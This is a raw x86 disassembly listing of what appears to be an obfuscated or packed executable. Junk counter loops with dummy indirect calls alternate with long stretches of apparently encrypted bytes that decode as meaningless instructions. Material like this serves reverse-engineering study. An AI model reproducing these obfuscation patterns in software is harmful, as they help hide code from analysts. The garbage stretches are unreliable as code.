  4018c2:	sbb    eax,0xb15a6ce9
  4018c7:	cli    
  4018c8:	pop    ecx
  4018c9:	adc    BYTE PTR [edi+ebx*4+0x46],0xc7
  4018ce:	idiv   BYTE PTR [esi]
  4018d0:	scas   eax,DWORD PTR es:[edi]
  4018d1:	xlat   BYTE PTR gs:[ebx]
  4018d3:	sbb    al,0x27
  4018d5:	fldcw  WORD PTR [esi-0x7e70e20e]
  4018db:	sub    al,0xc9
  4018dd:	add    BYTE PTR [ebx-0x54899a9c],ah
  4018e3:	loopne 0x40190f
  4018e5:	mul    DWORD PTR [edx+0x11]
  4018e8:	xor    DWORD PTR fs:[ecx+ebx*1+0x20],0x833ad658
  4018f1:	pop    eax
  4018f2:	repnz lds edx,FWORD PTR [ecx-0x34]
  4018f6:	dec    esi
  4018f7:	add    al,0xdb
  4018f9:	or     esi,DWORD PTR [ecx+0x19bd1ad2]
  4018ff:	add    DWORD PTR [esi-0x3006e8a3],eax
  401905:	dec    eax
  401906:	(bad)  
  401907:	rol    BYTE PTR [ebx-0x4],1
  40190a:	sbb    DWORD PTR [eax+0x44f8dfcc],esi
  401910:	scas   eax,DWORD PTR es:[edi]
  401911:	inc    eax
  401912:	sbb    BYTE PTR [ebx-0x66],0x3b
  401916:	test   ecx,ebx
  401918:	enter  0x65f7,0x24
  40191c:	inc    esp
  40191d:	sbb    al,0x16
  40191f:	inc    edi
  401920:	scas   eax,DWORD PTR es:[edi]
  401921:	jl     0x401930
  401923:	clc    
  401924:	js     0x401950
  401926:	(bad)  
  401927:	repz jae 0x4018b2
  40192a:	or     eax,0xcc9d6d9c
  40192f:	loop   0x4018f4
  401931:	mov    eax,DWORD PTR [ebp-0x14]
  401934:	jmp    0x40160d
  401939:	mov    eax,DWORD PTR [ebp-0xc]
  40193c:	mov    edx,DWORD PTR [ebp-0x18]
  40193f:	xor    eax,edx
  401941:	cmp    eax,0xe77c698d
  401946:	je     0x4015a9
  40194c:	mov    eax,DWORD PTR [ebp-0x10]
  40194f:	add    DWORD PTR [eax],0x7403501
  401955:	jmp    0x4015a9
  40195a:	mov    eax,DWORD PTR [ebp-0x1c]
  40195d:	cmp    DWORD PTR [eax],edi
  40195f:	je     0x4015a9
  401965:	mov    eax,0x800f1c9c
  40196a:	jmp    0x401622
  40196f:	push   ebp
  401970:	mov    ebp,esp
  401972:	sub    esp,0x44
  401975:	and    DWORD PTR ds:0x4292a1,0x0
  40197f:	mov    edx,DWORD PTR ds:0x4292a1
  401985:	inc    edx
  401986:	mov    DWORD PTR ds:0x4292a1,edx
  40198c:	cmp    DWORD PTR ds:0x4292a1,0x4
  401993:	jne    0x4019a4
  401999:	push   0x6284
  40199e:	call   DWORD PTR ds:0x4278e7
  4019a4:	cmp    DWORD PTR ds:0x4292a1,0x3
  4019ab:	jne    0x4019be
  4019b1:	mov    edx,DWORD PTR ds:0x4292a1
  4019b7:	inc    edx
  4019b8:	mov    DWORD PTR ds:0x4292a1,edx
  4019be:	cmp    DWORD PTR ds:0x4292a1,0x18
  4019c5:	jb     0x40197f
  4019cb:	push   edi
  4019cc:	jmp    0x401aec
  4019d1:	sbb    al,0xdb
  4019d3:	fcmovu st,st(6)
  4019d5:	std    
  4019d6:	sar    DWORD PTR [eax],1
  4019d8:	fstp   QWORD PTR [edi]
  4019da:	or     BYTE PTR [edx-0xc66be03],0x77
  4019e1:	cld    
  4019e2:	jae    0x401a60
  4019e4:	jl     0x401a57
  4019e6:	jg     0x401a64
  4019e8:	jl     0x40198d
  4019ea:	std    
  4019eb:	ds adc eax,0xcef8454
  4019f1:	(bad)  
  4019f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4019f3:	push   0x10
  4019f5:	pop    ds
  4019f6:	cmp    DWORD PTR [edi],esi
  4019f8:	jg     0x4019fa
  4019fa:	dec    ebp
  4019fb:	xor    dh,ah
  4019fd:	add    DWORD PTR [ecx],ebp
  4019ff:	dec    BYTE PTR [edx+0x64]
  401a02:	pop    ss
  401a03:	lock stc 
  401a05:	(bad)  
  401a07:	push   ebp
  401a08:	pop    eax
  401a09:	add    al,0xf3
  401a0b:	jmp    0x8c3a0858
  401a10:	adc    al,0x17
  401a12:	shl    DWORD PTR [ebp+0x4cf5f47],1
  401a18:	adc    BYTE PTR [ecx-0x6de0655b],0x26
  401a1f:	push   edx
  401a20:	(bad)  
  401a21:	pop    esi
  401a22:	inc    ecx
  401a23:	xor    eax,0xd92ab058
  401a28:	fiadd  DWORD PTR [eax-0x3d6539e]
  401a2e:	aad    0x34
  401a30:	push   cs
  401a31:	jecxz  0x4019b6
  401a33:	(bad)  
  401a35:	cmp    ch,BYTE PTR [esi]
  401a37:	hlt    
  401a38:	pusha  
  401a39:	pop    DWORD PTR [ecx+0x1c]
  401a3c:	mov    cl,0x62
  401a3e:	push   esp
  401a3f:	sub    ch,BYTE PTR [ecx-0xf]
  401a42:	retf   
  401a43:	sahf   
  401a44:	push   ds
  401a45:	jo     0x401abb
  401a47:	fnstcw WORD PTR [ecx+0x5]
  401a4a:	clc    
  401a4b:	xor    cl,BYTE PTR [ebp+0x32fe9a47]
  401a51:	int3   
  401a52:	fld    DWORD PTR [ecx]
  401a54:	loopne 0x401a5d
  401a56:	mov    eax,0xd4d4b0fb
  401a5b:	and    eax,DWORD PTR [esi-0x15]
  401a5e:	sahf   
  401a5f:	xchg   esi,eax
  401a60:	mov    esi,0x6f3e23de
  401a65:	sub    al,0x81
  401a67:	and    eax,0xc15e1f42
  401a6c:	push   cs
  401a6d:	into   
  401a6e:	ror    BYTE PTR [eax+0x31],0x8
  401a72:	and    BYTE PTR [ecx+0x5b],dh
  401a75:	popa   
  401a76:	dec    eax
  401a77:	xor    DWORD PTR [edi+eax*4+0x67e7f6ef],ecx
  401a7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401a7f:	mov    eax,ds:0x74c139c1
  401a84:	mov    cl,0x2a
  401a86:	cmp    eax,0x3ede81b7
  401a8b:	jl     0x401aff
  401a8d:	in     al,dx
  401a8e:	push   esi
  401a8f:	sub    ah,BYTE PTR [edi+0x5c6fd9f1]
  401a95:	dec    esi
  401a96:	aas    
  401a97:	sbb    esp,DWORD PTR [esi]
  401a99:	imul   edx,DWORD PTR [ecx-0x39],0xd480edc
  401aa0:	or     ebp,DWORD PTR [eax+0x6871f302]
  401aa6:	inc    edx
  401aa7:	cmp    al,0x98
  401aa9:	mov    BYTE PTR [esi+0x40],ah
  401aac:	push   ds
  401aad:	pop    esp
  401aae:	sbb    esi,esi
  401ab0:	cs ror esi,1
  401ab3:	push   eax
  401ab4:	(bad)  
  401ab6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401ab7:	call   0xbe9a:0xa5659b8
  401abe:	into   
  401abf:	rol    DWORD PTR [ebp-0x49],cl
  401ac2:	inc    edx
  401ac3:	pop    esi
  401ac4:	cld    
  401ac5:	into   
  401ac6:	stos   DWORD PTR es:[edi],eax
  401ac7:	pop    es
  401ac8:	hlt    
  401ac9:	sbb    eax,0x9f3210e6
  401ace:	adc    BYTE PTR [edx+0x60],dl
  401ad1:	hlt    
  401ad2:	mov    esi,0x777f982d
  401ad7:	sub    al,0x22
  401ad9:	xchg   ecx,eax
  401ada:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401adb:	sub    esp,edi
  401add:	pop    edi
  401ade:	cmp    ah,BYTE PTR [ecx]
  401ae0:	adc    ebp,DWORD PTR [esi+0x34228ee1]
  401ae6:	mov    BYTE PTR [ebp+0x62c45c4b],al
  401aec:	mov    eax,DWORD PTR [ebp+0xc]
  401aef:	and    DWORD PTR ds:0x4292cd,0x0
  401af9:	jmp    0x401b0b
  401afe:	mov    ecx,DWORD PTR ds:0x4292cd
  401b04:	inc    ecx
  401b05:	mov    DWORD PTR ds:0x4292cd,ecx
  401b0b:	cmp    DWORD PTR ds:0x4292cd,0x11
  401b12:	jae    0x401b69
  401b18:	cmp    DWORD PTR ds:0x4292cd,0x4
  401b1f:	jne    0x401b40
  401b25:	push   0x3f75
  401b2a:	push   0x4292cd
  401b2f:	push   DWORD PTR [ebp-0xc]
  401b32:	push   DWORD PTR [ebp-0xc]
  401b35:	push   0x5572
  401b3a:	call   DWORD PTR ds:0x4279bb
  401b40:	cmp    DWORD PTR ds:0x4292cd,0x3
  401b47:	jne    0x401b5a
  401b4d:	mov    ecx,DWORD PTR ds:0x4292cd
  401b53:	inc    ecx
  401b54:	mov    DWORD PTR ds:0x4292cd,ecx
  401b5a:	jmp    0x401afe
  401b5f:	mov    DWORD PTR ds:0x4292c9,0x72d4
  401b69:	mov    DWORD PTR [ebp-0x10],eax
  401b6c:	and    DWORD PTR ds:0x42c882,0x0
  401b76:	jmp    0x401b8a
  401b7b:	xor    ecx,ecx
  401b7d:	xor    ecx,DWORD PTR ds:0x42c882
  401b83:	inc    ecx
  401b84:	mov    DWORD PTR ds:0x42c882,ecx
  401b8a:	cmp    DWORD PTR ds:0x42c882,0x1c
  401b91:	jae    0x401bde
  401b97:	cmp    DWORD PTR ds:0x42c882,0x6
  401b9e:	jne    0x401bb9
  401ba4:	push   0x3a01
  401ba9:	push   0x1f68
  401bae:	push   0x4e47
  401bb3:	call   DWORD PTR ds:0x4278eb
  401bb9:	cmp    DWORD PTR ds:0x42c882,0x5
  401bc0:	jne    0x401bd3
  401bc6:	mov    ecx,DWORD PTR ds:0x42c882
  401bcc:	inc    ecx
  401bcd:	mov    DWORD PTR ds:0x42c882,ecx
  401bd3:	jmp    0x401b7b
  401bd8:	or     edx,0x1630
  401bde:	mov    eax,DWORD PTR [ebp+0x8]
  401be1:	mov    DWORD PTR [ebp+0x8],0xf89c8535
  401be8:	mov    DWORD PTR [ebp-0x20],0xf89c8534
  401bef:	mov    ecx,DWORD PTR ds:0x42c886
  401bf5:	xor    DWORD PTR ds:0x4292cd,ecx
  401bfb:	mov    edx,DWORD PTR [ebp+0x8]
  401bfe:	sbb    DWORD PTR ds:0x427d1f,0x4512
  401c08:	mov    DWORD PTR [ebp-0x40],eax
  401c0b:	mov    eax,0x7510857
  401c10:	adc    ecx,0xd62
  401c16:	jmp    0x401d36
  401c1b:	adc    eax,DWORD PTR [ecx-0x2451948]
  401c21:	push   ebp
  401c22:	pop    ebp
  401c23:	aaa    
  401c24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401c25:	popa   
  401c26:	lods   al,BYTE PTR ds:[esi]
  401c27:	dec    ebx
  401c28:	jae    0x401bd3
  401c2a:	stc    
  401c2b:	icebp  
  401c2c:	jb     0x401caa
  401c2e:	jl     0x401ca1
  401c30:	jg     0x401cae
  401c32:	jl     0x401cac
  401c34:	xor    al,BYTE PTR [esi]
  401c36:	ins    BYTE PTR es:[edi],dx
  401c37:	jmp    0xfb07:0x4c62e80b
  401c3e:	sbb    esp,DWORD PTR [edx]
  401c40:	cmp    BYTE PTR [esi+0x6e],cl
  401c43:	retf   0x40d0
  401c46:	sub    al,0xbc
  401c48:	pop    ebx
  401c49:	jp     0x401c45
  401c4b:	dec    ecx
  401c4c:	fstp   QWORD PTR [esi-0x7e]
  401c4f:	push   edx
  401c50:	sbb    edx,DWORD PTR [edi]
  401c52:	ds test eax,0xf24af8e4
  401c58:	xchg   esi,eax
  401c59:	inc    edi
  401c5a:	xlat   BYTE PTR ds:[ebx]
  401c5b:	and    DWORD PTR [ebx-0x239d84ab],edi
  401c61:	add    eax,0x541cdc33
  401c66:	ins    DWORD PTR es:[edi],dx
  401c67:	ins    DWORD PTR es:[edi],dx
  401c68:	in     eax,0xc0
  401c6a:	jmp    0xfa39f008
  401c6f:	jge    0x401c38
  401c71:	clc    
  401c72:	or     ah,BYTE PTR [edi]
  401c74:	pop    ss
  401c75:	mov    ch,0x7e
  401c77:	hlt    
  401c78:	test   al,0x9c
  401c7a:	outs   dx,DWORD PTR ds:[esi]
  401c7b:	shr    DWORD PTR [edx+0x6b],1
  401c7e:	push   edx
  401c7f:	adc    ebp,DWORD PTR [ecx+0x22]
  401c82:	xor    ebp,DWORD PTR [eax]
  401c84:	adc    al,0xeb
  401c86:	xor    DWORD PTR [edx-0x2a],ebp
  401c89:	inc    esp
  401c8a:	mov    eax,0xa21ed313
  401c8f:	or     al,0xd4
  401c91:	stos   DWORD PTR es:[edi],eax
  401c92:	push   edi
  401c93:	imul   eax,ecx,0xd
  401c96:	popf   
  401c97:	jge    0x401c1d
  401c99:	retf   0xb1c7
  401c9c:	sbb    BYTE PTR [esi],ch
  401c9e:	sbb    DWORD PTR [edx+ecx*2-0x5f6a9735],0x1d09f8a1
  401ca9:	sbb    eax,0xc054ffd3
  401cae:	bound  esi,QWORD PTR [eax-0x72ae9bef]
  401cb4:	sub    al,0x48
  401cb6:	outs   dx,BYTE PTR ds:[esi]
  401cb7:	adc    edx,DWORD PTR [ebx-0x36d7a0fb]
  401cbd:	retf   0xd3fc
  401cc0:	ror    DWORD PTR [ecx],0xd6
  401cc3:	mov    esi,0x186f5db2
  401cc8:	dec    ebp
  401cc9:	stc    
  401cca:	pop    ebp
  401ccb:	inc    eax
  401ccc:	sahf   
  401ccd:	mov    cl,0x4c
  401ccf:	imul   edx,DWORD PTR [esi+0x46],0xffffff82
  401cd3:	sub    BYTE PTR [ecx-0x47],0xff
  401cd7:	push   ds
  401cd8:	sub    eax,0xab08f94
  401cdd:	adc    ebp,edi
  401cdf:	inc    edx
  401ce0:	lock fsub QWORD PTR [eax+0x5c2dc60d]
  401ce7:	cmc    
  401ce8:	packsswb mm0,QWORD PTR [edx+0x647818d0]
  401cef:	test   ch,dl
  401cf1:	add    DWORD PTR [eax-0x5a],0x9c719baf
  401cf8:	jmp    0xd14e:0xca399d1
  401cff:	shr    DWORD PTR [edx],1
  401d01:	inc    edx
  401d02:	aaa    
  401d03:	lock (bad) 
  401d05:	fdiv   DWORD PTR [ebx-0x7fa5196d]
  401d0b:	inc    esp
  401d0c:	xchg   dl,ch
  401d0e:	(bad)  
  401d10:	inc    ebp
  401d11:	or     eax,0x74f81462
  401d16:	inc    edx
  401d17:	ret    0xf87a
  401d1a:	push   edx
  401d1b:	jmp    0xd7550116
  401d20:	pop    ebx
  401d21:	int    0x77
  401d23:	inc    esp
  401d24:	mov    eax,0x667da08a
  401d29:	mov    ds:0x79cf6c40,eax
  401d2e:	push   cs
  401d2f:	mov    cl,0x54
  401d31:	int3   
  401d32:	push   edi
  401d33:	jg     0x401d82
  401d35:	imul   esi,DWORD PTR [ebx],0xc11581d0
  401d3b:	xchg   edx,eax
  401d3c:	inc    edx
  401d3d:	add    BYTE PTR [esi-0x16ffffc4],dh
  401d43:	sbb    eax,DWORD PTR [ecx]
  401d45:	add    BYTE PTR [eax],al
  401d47:	(bad)  
  401d48:	mov    eax,0x13bd709b
  401d4d:	cdq    
  401d4e:	mov    edx,0x91382f2
  401d53:	fisubr DWORD PTR [ebx+0x18]
  401d56:	inc    edi
  401d57:	bnd jne 0x401dd6
  401d5a:	jl     0x401dcd
  401d5c:	jg     0x401dda
  401d5e:	jl     0x401d02
  401d60:	sbb    edi,0x845dd4e3
  401d66:	imul   edi,DWORD PTR [ebx-0x4f],0xffffffd2
  401d6a:	sub    esp,esi
  401d6c:	mov    al,0xb
  401d6e:	sbb    DWORD PTR [ebp-0x3f],ecx
  401d71:	loopne 0x401cf8
  401d73:	inc    esi
  401d74:	mov    ecx,0x9755e328
  401d79:	call   0x720f374a
  401d7e:	mov    ds:0x9a0134b6,eax
  401d83:	cwde   
  401d84:	cmp    eax,0xcc6378fb
  401d89:	in     eax,dx
  401d8a:	jl     0x401d5c
  401d8c:	mov    cl,0x13
  401d8e:	popf   
  401d8f:	add    DWORD PTR [ecx+0x415575a6],0x6e
  401d96:	xor    eax,0x50455f05
  401d9b:	add    al,0xe5
  401d9d:	std    
  401d9e:	out    0x7f,eax
  401da0:	and    dl,BYTE PTR [esp+edi*8+0x43]
  401da4:	push   esi
  401da5:	push   esp
  401da6:	mov    bh,0x11
  401da8:	mov    bh,0x7c
  401daa:	jmp    0x401dd2
  401dac:	cdq    
  401dad:	pop    bp
  401daf:	fucomp st(1)
  401db1:	lods   al,BYTE PTR ds:[esi]
  401db2:	cmp    BYTE PTR cs:[ecx+0x7b],ah
  401db6:	inc    edx
  401db7:	mov    ebx,ss
  401db9:	or     ebx,edx
  401dbb:	mov    DWORD PTR [ecx-0x40],esp
  401dbe:	sub    BYTE PTR [edx+0x35],ah
  401dc1:	sub    al,0xbb
  401dc3:	(bad)
  401dc6:	loopne 0x401d72
  401dc8:	out    0x34,eax
  401dca:	outs   dx,DWORD PTR ds:[esi]
  401dcb:	rcr    ecx,cl
  401dcd:	xlat   BYTE PTR ds:[ebx]
  401dce:	dec    edi
  401dcf:	inc    ebx
  401dd0:	int    0xc
  401dd2:	loopne 0x401dd7
  401dd4:	push   es
  401dd5:	and    esp,ecx
  401dd7:	ins    BYTE PTR es:[edi],dx
  401dd8:	call   0xd98bf7b8
  401ddd:	push   fs
  401ddf:	scas   al,BYTE PTR es:[edi]
  401de0:	mov    bh,0x59
  401de2:	and    DWORD PTR [ebp+0x55],esi
  401de5:	xor    esi,edx
  401de7:	sbb    DWORD PTR [ecx+0x19faebf5],edx
  401ded:	xchg   BYTE PTR [esi-0x66],al
  401df0:	fwait
  401df1:	repnz mov esp,0x374c6cb6
  401df7:	cdq    
  401df8:	mov    bl,0x44
  401dfa:	ret    
  401dfb:	mov    ds:0x27ba8e8,al
  401e00:	call   0xb492:0x274823d4
  401e07:	push   esi
  401e08:	cdq    
  401e09:	push   edx
  401e0a:	lds    ecx,FWORD PTR [si-0x7422]
  401e0f:	or     bl,bl
  401e11:	push   0xb283d27b
  401e16:	mov    cl,0x4f
  401e18:	adc    esi,edx
  401e1a:	shl    BYTE PTR [esi+0x2a30d8b9],cl
  401e20:	in     al,0x4a
  401e22:	adc    al,0xa
  401e24:	pop    edi
  401e25:	xchg   DWORD PTR [eax+edx*8+0x409ea47d],esi
  401e2c:	scas   eax,DWORD PTR es:[edi]
  401e2d:	ins    DWORD PTR es:[edi],dx
  401e2e:	xchg   edi,eax
  401e2f:	xchg   DWORD PTR [esi],ebx
  401e31:	je     0x401de5
  401e33:	jbe    0x401dbf
  401e35:	arpl   WORD PTR [esi+0x46],sp
  401e38:	push   esp
  401e39:	loope  0x401e17
  401e3b:	or     BYTE PTR [ebp+0x545ecccb],dl
  401e41:	jmp    0x5cb7:0x9cb87d90
  401e48:	mov    dl,0xb5
  401e4a:	cwde   
  401e4b:	ror    BYTE PTR [ecx+0x77],cl
  401e4e:	inc    eax
  401e4f:	adc    ebx,DWORD PTR [esp+eax*8+0x772611f1]
  401e56:	(bad)  
  401e57:	sub    eax,0xbb9eac2d
  401e5c:	pop    ss
  401e5d:	xchg   ecx,eax
  401e5e:	xchg   DWORD PTR [edi+eax*4],edi
  401e61:	xchg   ebp,eax
  401e62:	mov    ecx,0x32729e
  401e67:	adc    DWORD PTR ds:0x427d17,ecx
  401e6d:	add    edx,ecx
  401e6f:	and    edi,DWORD PTR ds:0x4292a1
  401e75:	mov    DWORD PTR [ebp-0x8],edx
  401e78:	adc    DWORD PTR ds:0x427d07,0x2336
  401e82:	mov    edx,DWORD PTR [ebp+0x8]
  401e85:	and    DWORD PTR ds:0x427d1b,0x0
  401e8f:	mov    edi,DWORD PTR ds:0x427d1b
  401e95:	inc    edi
  401e96:	mov    DWORD PTR ds:0x427d1b,edi
  401e9c:	cmp    DWORD PTR ds:0x427d1b,0x2b
  401ea3:	jne    0x401eb2
  401ea9:	push   DWORD PTR [ebp-0x1c]
  401eac:	call   DWORD PTR ds:0x427a8b
  401eb2:	cmp    DWORD PTR ds:0x427d1b,0x1e
  401eb9:	jb     0x401e8f
  401ebf:	mov    edi,DWORD PTR ds:0x4292d9
  401ec5:	and    DWORD PTR ds:0x427d13,edi
  401ecb:	xor    edx,eax
  401ecd:	adc    edi,DWORD PTR ds:0x4292c9
  401ed3:	add    edx,ecx
  401ed5:	mov    DWORD PTR ds:0x4275b0,0x10
  401edf:	cmp    DWORD PTR ds:0x4275b0,0x0
  401ee6:	je     0x401f33
  401eec:	cmp    DWORD PTR ds:0x4275b0,0x6
  401ef3:	jne    0x401f07
  401ef9:	push   DWORD PTR [ebp-0x10]
  401efc:	push   0x12c3
  401f01:	call   DWORD PTR ds:0x4279bf
  401f07:	cmp    DWORD PTR ds:0x4275b0,0x7
  401f0e:	jne    0x401f21
  401f14:	mov    edi,DWORD PTR ds:0x4275b0
  401f1a:	dec    edi
  401f1b:	mov    DWORD PTR ds:0x4275b0,edi
  401f21:	mov    edi,DWORD PTR ds:0x4275b0
  401f27:	dec    edi
  401f28:	mov    DWORD PTR ds:0x4275b0,edi
  401f2e:	jmp    0x401edf
  401f33:	mov    DWORD PTR [ebp+0xc],edx
  401f36:	mov    DWORD PTR [ebp-0x4],0xf89c85d5
  401f3d:	xor    edi,edi
  401f3f:	add    edi,DWORD PTR ds:0x427d1f
  401f45:	adc    DWORD PTR ds:0x4292c9,edi
  401f4b:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  401f52:	mov    DWORD PTR [ebp-0x2c],0xf89c8532
  401f59:	and    DWORD PTR ds:0x42c896,0x0
  401f63:	jmp    0x401f77
  401f68:	xor    edi,edi
  401f6a:	or     edi,DWORD PTR ds:0x42c896
  401f70:	inc    edi
  401f71:	mov    DWORD PTR ds:0x42c896,edi
  401f77:	cmp    DWORD PTR ds:0x42c896,0x1c
  401f7e:	jae    0x401fc4
  401f84:	cmp    DWORD PTR ds:0x42c896,0xe
  401f8b:	jne    0x401fa3
  401f91:	push   0x0
  401f93:	push   0x55c0
  401f98:	push   0x3960
  401f9d:	call   DWORD PTR ds:0x427a8f
  401fa3:	cmp    DWORD PTR ds:0x42c896,0xd
  401faa:	jne    0x401fbd
  401fb0:	mov    edi,DWORD PTR ds:0x42c896
  401fb6:	inc    edi
  401fb7:	mov    DWORD PTR ds:0x42c896,edi
  401fbd:	jmp    0x401f68
  401fc2:	and    edi,edi
  401fc4:	mov    DWORD PTR [ebp-0x30],0xf89c8531
  401fcb:	mov    DWORD PTR [ebp-0x34],0xf89c8530
  401fd2:	and    DWORD PTR ds:0x4292bd,0x0
  401fdc:	mov    edi,DWORD PTR ds:0x4292bd
  401fe2:	inc    edi
  401fe3:	mov    DWORD PTR ds:0x4292bd,edi
  401fe9:	cmp    DWORD PTR ds:0x4292bd,0x15
  401ff0:	jne    0x402006
  401ff6:	push   0x3d92
  401ffb:	push   0x4275c4
  402000:	call   DWORD PTR ds:0x4279c3
  402006:	cmp    DWORD PTR ds:0x4292bd,0x12
  40200d:	jb     0x401fdc
  402013:	and    edi,0x7576
  402019:	jmp    0x402139
  40201e:	loopne 0x402062
  402020:	sbb    edx,ebp
  402022:	mov    ecx,0xbb5ae36d
  402027:	xchg   esp,eax
  402028:	inc    eax
  402029:	pop    es
  40202a:	push   esp
  40202b:	mov    esi,0x74f747e5
  402030:	jl     0x4020ae
  402032:	jno    0x4020b3
  402034:	jl     0x4020b2
  402036:	lods   al,BYTE PTR ds:[esi]
  402037:	leave  
  402038:	ret    
  402039:	data16 xor al,0xc6
  40203c:	or     eax,0xa57062b8
  402041:	add    ah,BYTE PTR [ebx-0x79]
  402044:	out    dx,eax
  402045:	pop    esp
  402046:	xor    eax,0xe6641086
  40204b:	lock mov ds:0xa2be459a,al
  402051:	push   edx
  402052:	mov    eax,ds:0xcfc3ea2e
  402057:	in     eax,0xa3
  402059:	in     al,0x4d
  40205b:	ds lock jg 0x402057
  40205f:	icebp  
  402060:	xor    ch,bl
  402062:	(bad)  
  402063:	mov    esi,0xdd2cc973
  402068:	ret    0x7163
  40206b:	push   ecx
  40206c:	in     eax,dx
  40206d:	and    cl,BYTE PTR [eax]
  40206f:	adc    ebx,DWORD PTR [ecx]
  402071:	daa    
  402072:	aaa    
  402073:	test   al,0x62
  402075:	mov    DWORD PTR [esp+edx*4+0x60c0bb55],ecx
  40207c:	in     al,0x4c
  40207e:	cmp    ch,ch
  402080:	imul   esp
  402082:	jbe    0x4020b6
  402084:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402085:	fcomp  st(5)
  402087:	scas   al,BYTE PTR es:[edi]
  402088:	fistp  DWORD PTR [esi]
  40208a:	cld    
  40208b:	nop
  40208c:	stos   DWORD PTR es:[edi],eax
  40208d:	and    ch,bl
  40208f:	add    eax,0x6fab1cc9
  402094:	sbb    al,0x42
  402096:	and    eax,0x77a2a567
  40209b:	push   ecx
  40209c:	shr    DWORD PTR [edi+0x6267a974],0x45
  4020a3:	cdq    
  4020a4:	rol    BYTE PTR [eax],cl
  4020a6:	ror    edi,1
  4020a8:	xchg   ebp,eax
  4020a9:	rcl    DWORD PTR ds:0x7b76053e,0xc8
  4020b0:	xor    BYTE PTR [esi],dh
  4020b2:	iret   
  4020b3:	scas   al,BYTE PTR es:[edi]
  4020b4:	or     al,0x30
  4020b6:	icebp  
  4020b7:	sbb    DWORD PTR [edx],0xffffffb8
  4020ba:	jno    0x40205c
  4020bc:	mov    ebx,0xb6a06f7a
  4020c1:	mov    ch,0xb7
  4020c3:	jnp    0x4020ee
  4020c5:	rcr    ebx,cl
  4020c7:	in     al,dx
  4020c8:	sub    edx,DWORD PTR [edx-0x4d]
  4020cb:	retf   0x30cf
  4020ce:	dec    edi
  4020cf:	addr16 aaa 
  4020d1:	cmp    eax,0x96b7b0
  4020d6:	dec    ebx
  4020d7:	fstp   QWORD PTR [ecx-0x1b]
  4020da:	xchg   DWORD PTR [esi],esi
  4020dc:	xlat   BYTE PTR ds:[ebx]
  4020dd:	add    DWORD PTR [ebp+eax*2-0x4ecce8f8],0xffffffce
  4020e5:	xchg   ebp,eax
  4020e6:	imul   esi,DWORD PTR [eax+0x58],0x45
  4020ea:	int3   
  4020eb:	jae    0x40208b
  4020ed:	aas    
  4020ee:	push   es
  4020ef:	add    DWORD PTR [edx],0xfa91d64a
  4020f5:	int    0xcf
  4020f7:	das    
  4020f8:	aam    0xb
  4020fa:	add    BYTE PTR fs:[ebx+0x675446a],bl
  402101:	mov    esi,0x76f62372
  402106:	push   ds
  402107:	push   0xffffffbb
  402109:	imul   edx,eax,0x3e
  40210c:	out    0x44,al
  40210e:	(bad)  
  40210f:	pusha  
  402110:	xchg   esp,eax
  402111:	push   0xe24b5278
  402116:	jl     0x40212e
  402118:	test   DWORD PTR [eax+0x13],0xdaa2139c
  40211f:	jmp    0x56b7ab34
  402124:	arpl   WORD PTR [edi],ax
  402126:	dec    esp
  402127:	lods   al,BYTE PTR ds:[esi]
  402128:	bound  ebp,QWORD PTR [edi+0x1b]
  40212b:	ja     0x40212e
  40212d:	mov    ds:0xd7ed0bfd,eax
  402132:	jecxz  0x4020e1
  402134:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402135:	jne    0x4020fe
  402137:	jns    0x402178
  402139:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  402140:	mov    DWORD PTR [ebp-0x3c],0xf89c853e
  402147:	or     edx,edi
  402149:	mov    edx,DWORD PTR [ebp+0x8]
  40214c:	xor    edx,eax
  40214e:	mov    edi,DWORD PTR [ebp-0x10]
  402151:	neg    DWORD PTR ds:0x4292b5
  402157:	add    edx,ecx
  402159:	mov    DWORD PTR ds:0x4292bd,0x7886
  402163:	cmp    edi,edx
  402165:	je     0x402c82
  40216b:	mov    DWORD PTR ds:0x4292c5,0x3488
  402175:	push   ebx
  402176:	jmp    0x402c5d
  40217b:	mov    edx,DWORD PTR [ebp-0x8]
  40217e:	or     DWORD PTR ds:0x42c892,0x427cf7
  402188:	mov    edi,DWORD PTR [ebp-0x10]
  40218b:	mov    DWORD PTR ds:0x4292c1,0x6c77
  402195:	sub    edi,edx
  402197:	and    DWORD PTR ds:0x4292dd,0x0
  4021a1:	mov    edx,DWORD PTR ds:0x4292dd
  4021a7:	inc    edx
  4021a8:	mov    DWORD PTR ds:0x4292dd,edx
  4021ae:	cmp    DWORD PTR ds:0x4292dd,0x8
  4021b5:	jne    0x4021c9
  4021bb:	push   0x61e8
  4021c0:	push   DWORD PTR [ebp-0x14]
  4021c3:	call   DWORD PTR ds:0x4279c7
  4021c9:	cmp    DWORD PTR ds:0x4292dd,0x7
  4021d0:	jne    0x4021e3
  4021d6:	mov    edx,DWORD PTR ds:0x4292dd
  4021dc:	inc    edx
  4021dd:	mov    DWORD PTR ds:0x4292dd,edx
  4021e3:	cmp    DWORD PTR ds:0x4292dd,0x1a
  4021ea:	jb     0x4021a1
  4021f0:	xor    DWORD PTR ds:0x427cf7,0x6435
  4021fa:	mov    edx,DWORD PTR [ebp-0x4]
  4021fd:	xor    edx,eax
  4021ff:	xor    DWORD PTR ds:0x427cff,0x42c896
  402209:	add    edx,ecx
  40220b:	cmp    edi,edx
  40220d:	mov    DWORD PTR ds:0x42c892,0x3c1d
  402217:	jb     0x402c81
  40221d:	mov    edx,DWORD PTR [ebp-0x28]
  402220:	jmp    0x402340
  402225:	fstp   DWORD PTR [edi-0x39]
  402228:	xlat   BYTE PTR ds:[ebx]
  402229:	jns    0x402292
  40222b:	stc    
  40222c:	popa   
  40222d:	mov    ebx,0x5e3fc869
  402232:	lods   al,BYTE PTR ds:[esi]
  402233:	stos   DWORD PTR es:[edi],eax
  402234:	mov    dl,0x88
  402236:	ja     0x4022b4
  402238:	jl     0x4022ab
  40223a:	jg     0x4022b8
  40223c:	jl     0x402262
  40223e:	imul   ebp,DWORD PTR [eax+0x72277f2f],0x2f
  402245:	pop    ds
  402246:	fs jmp 0xdc2776d3
  40224c:	and    BYTE PTR [edx],dl
  40224e:	test   DWORD PTR [eax+0x6fabb9c4],esp
  402254:	lods   al,BYTE PTR ds:[esi]
